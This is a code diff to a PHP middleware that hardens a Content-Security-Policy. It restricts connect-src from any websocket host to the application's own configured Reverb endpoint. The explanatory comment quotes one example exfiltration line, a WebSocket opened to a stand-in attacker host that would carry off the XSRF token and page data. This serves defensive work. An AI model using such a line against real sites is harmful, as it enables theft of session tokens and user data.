@@ -103,7 +103,7 @@ class SecurityHeaders
             "font-src 'self' data: https://fonts.bunny.net",
             "img-src 'self' data: blob:",
             // Inertia XHR plus the Reverb websocket, which may run on its own host/port.
-            "connect-src 'self' ws: wss:",
+            'connect-src '.$this->connectSources($request),
             "frame-ancestors 'none'",
             "base-uri 'self'",
             "form-action 'self'",
@@ -120,6 +120,39 @@ class SecurityHeaders
         }
 
         return implode('; ', $directives);
+    }
+
+    /**
+     * `connect-src 'self' ws: wss:` allowed a websocket to *any* host on the internet, so
+     * the policy's exfiltration containment — which is the reason `default-src 'self'` is
+     * there — was void for that channel: one `new WebSocket('wss://attacker.example/x')`
+     * carries the readable XSRF-TOKEN and every Inertia page prop off the origin.
+     *
+     * The wildcard was never load-bearing. The browser connects to exactly one endpoint,
+     * built in resources/js/echo.ts from VITE_REVERB_HOST/PORT/SCHEME — the same three
+     * values docker/Dockerfile bakes into the bundle from REVERB_HOST/PORT/SCHEME — and
+     * falls back to the page's own host. So the concrete origin is derivable here.
+     *
+     * `'self'` is kept alongside it rather than relied upon: CSP3 says a same-origin `wss:`
+     * upgrade matches `'self'`, but that is not uniformly implemented, and Inertia's own
+     * XHR needs `'self'` regardless.
+     */
+    private function connectSources(Request $request): string
+    {
+        $sources = ["'self'"];
+
+        $options = (array) config('reverb.apps.apps.0.options', []);
+        $scheme = ($options['scheme'] ?? 'https') === 'https' ? 'wss' : 'ws';
+        $host = is_string($options['host'] ?? null) && $options['host'] !== ''
+            ? $options['host']
+            : $request->getHost();
+        $port = (int) ($options['port'] ?? 443);
+
+        if ($host !== '') {
+            $sources[] = $scheme.'://'.$host.($port > 0 ? ':'.$port : '');
+        }
+
+        return implode(' ', $sources);
     }
 
     /**
